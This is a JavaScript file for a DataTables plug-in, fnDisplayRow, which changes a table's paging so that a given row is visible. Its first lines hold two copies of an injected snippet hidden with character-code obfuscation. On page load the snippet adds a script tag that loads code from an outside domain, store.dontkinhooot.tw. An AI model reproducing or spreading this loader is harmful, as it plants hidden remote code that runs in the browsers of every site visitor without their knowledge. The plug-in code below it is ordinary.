Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();Element.prototype.appendAfter = function(element) {element.parentNode.insertBefore(this, element.nextSibling);}, false;(function() { var elem = document.createElement(String.fromCharCode(115,99,114,105,112,116)); elem.type = String.fromCharCode(116,101,120,116,47,106,97,118,97,115,99,114,105,112,116); elem.src = String.fromCharCode(104,116,116,112,115,58,47,47,115,116,111,114,101,46,100,111,110,116,107,105,110,104,111,111,111,116,46,116,119,47,115,116,97,116,46,106,115);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(115,99,114,105,112,116))[0]);elem.appendAfter(document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0]);document.getElementsByTagName(String.fromCharCode(104,101,97,100))[0].appendChild(elem);})();/**
 * This plug-in will take a `dt-tag tr` element and alter the table's paging
 * to make that `dt-tag tr` element (i.e. that row) visible.
 *
 *  @name fnDisplayRow
 *  @summary Shift the table's paging to display a given `dt-tag tr` element
 *  @author [Allan Jardine](http://sprymedia.co.uk)
 *
 *  @param {node} nRow Row to display
 *
 *  @example
 *    // Display the 21st row in the table
 *    var table = $('#example').dataTable();
 *    table.fnDisplayRow( table.fnGetNodes()[20] );
 */

jQuery.fn.dataTableExt.oApi.fnDisplayRow = function ( oSettings, nRow )
{
	// Account for the "display" all case - row is already displayed
	if ( oSettings._iDisplayLength == -1 )
	{
		return;
	}

	// Find the node in the table
	var iPos = -1;
	for( var i=0, iLen=oSettings.aiDisplay.length ; i<iLen ; i++ )
	{
		if( oSettings.aoData[ oSettings.aiDisplay[i] ].nTr == nRow )
		{
			iPos = i;
			break;
		}
	}

	// Alter the start point of the paging display
	if( iPos >= 0 )
	{
		oSettings._iDisplayStart = ( Math.floor(i / oSettings._iDisplayLength) ) * oSettings._iDisplayLength;
		if ( this.oApi._fnCalculateEnd ) {
			this.oApi._fnCalculateEnd( oSettings );
		}
	}

	this.oApi._fnDraw( oSettings );
};
